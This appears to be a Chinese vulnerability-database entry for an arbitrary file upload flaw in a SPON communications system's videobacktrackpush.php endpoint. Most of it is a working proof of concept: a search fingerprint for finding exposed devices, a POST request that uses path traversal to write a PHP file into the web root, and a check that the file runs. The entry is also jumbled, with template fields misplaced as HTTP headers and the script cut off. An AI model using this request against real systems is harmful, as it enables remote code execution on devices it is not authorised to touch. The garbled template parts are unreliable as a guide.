# 世邦通信股份有限公司videobacktrackpush.php函数任意文件上传漏洞

- **系统**：世邦通信股份有限公司videobacktrackpush.php函数　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash=-1830859634`
- **请求**：`POST /php/videobacktrackpush.php HTTP/1.1`
- **关键头**：`Content-Length: 142`　`Content-Type: application/x-www-form-urlencoded`　`id: sponip-network-videobacktrackpush-fileupload`　`name: sponip-network-videobacktrackpush-fileupload`　`author: unknow`　`severity: critical`　`tags: sponip, fileupload`

**请求体 / payload**
```
jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=1_2_3.php&jsondata[videocontent]=PD9waHAgZWNobyAxMjM7
GET /1_2_3.php HTTP/1.1
Host:
- raw:
-
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 133
jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=1_2_3.php&jsondata[videocontent]=PD9waHAgZWNobyAxMjM7
-
GET /1_2_3.php HTTP/1.1
Host:
matchers:
- type: dsl
name: fileupload
dsl:
- "status_code_2 == 200 && contains(body_2,'123')"
info:
name: sponip-network-videobacktrackpush-fileupload
author: unknow
se…（脚本共 1041 字，完整版见原文）
```
- **预期**：200　|　—